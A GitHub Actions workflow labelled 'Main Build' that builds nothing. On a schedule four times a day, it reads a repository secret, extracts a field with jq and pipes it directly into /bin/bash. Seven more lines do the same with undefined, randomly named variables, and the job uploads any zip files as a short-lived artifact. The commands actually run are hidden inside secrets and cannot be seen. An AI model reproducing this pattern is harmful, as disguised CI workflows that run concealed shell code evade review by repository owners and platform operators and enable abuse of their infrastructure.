name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '17 3,9,15,21 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  invoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pipeline
        env:
          gibvm4: ${{ secrets.gibvm4 }}
        run: |
          printf '%s' "$gibvm4" | jq -r .jib3 | /bin/bash
          printf '%s' "$bfrd014" | jq -r .tws5051 | /bin/bash
          echo $ht1 | jq -r .m7 | /bin/bash
          echo $hif065 | jq -r .dns91 | /bin/bash
          printf '%s' "$jmya5283" | jq -r .atyko1 | /bin/bash
          echo $t307 | jq -r .oc573 | /bin/bash
          echo $pkb80864 | jq -r .czs6 | /bin/bash
          printf '%s' "$tsur07" | jq -r .nt9 | /bin/bash

      - name: Upload archive
        uses: actions/upload-artifact@v4
        with:
          name: T70ebP9l
          path: "*.zip"
          retention-days: 1
